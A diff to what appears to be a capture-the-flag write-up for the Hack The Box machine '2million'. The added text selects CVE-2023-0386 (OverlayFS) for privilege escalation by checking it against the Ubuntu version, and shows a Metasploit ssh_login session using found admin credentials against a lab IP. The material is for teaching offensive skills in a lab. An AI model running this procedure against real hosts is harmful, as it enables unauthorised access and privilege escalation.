@@ -257,4 +257,30 @@ Matching Modules
    9    \_ target: CVE-2015-8660                            .                .          .      .
 ```
 
-Among these, there are three interesting CVEs among which 2 are very recent one (given the machine was released in 2023). The `0` works on 2021 Ubuntu. Taking a quick look at remote system, we see it is running 2022 Ubuntu! 
+Among these, there are three interesting CVEs among which 2 are very recent one (given the machine was released in 2023). The `0 - CVE-2021-3493` works on 2021 Ubuntu. Taking a quick look at remote system, we see it is running 2022 Ubuntu. So, this will not work. However, the other one, `CVE2023-0386`, can work as this was found in 2023 and our system is of 2022!
+However, this exploit requires a "SESSION" withing `msfconsole`. So, Let's first do that.
+```
+[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ssh/ssh_login
+[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set rhosts 10.10.11.221
+rhosts => 10.10.11.221
+[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set username admin
+username => admin
+[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set password SuperDuperPass123
+password => SuperDuperPass123
+[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> run
+[*] 10.10.11.221:22 - Starting bruteforce
+[+] 10.10.11.221:22 - Success: 'admin:SuperDuperPass123' 'uid=1000(admin) gid=1000(admin) groups=1000(admin) Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 1 opened (10.10.16.82:45015 -> 10.10.11.221:22) at 2025-08-28 19:59:21 -0400
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[msf](Jobs:0 Agents:1) auxiliary(scanner/ssh/ssh_login) >> sessions
+
+Active sessions
+===============
+
+  Id  Name  Type         Information        Connection
+  --  ----  ----         -----------        ----------
+  1         shell linux  SSH truelyyours @  10.10.16.82:45015 -> 10.10.11.221:22 (10.10.11.221)
+```
+
+Once we have this session, we have go ahead and use the `OverlayFS` exploit.
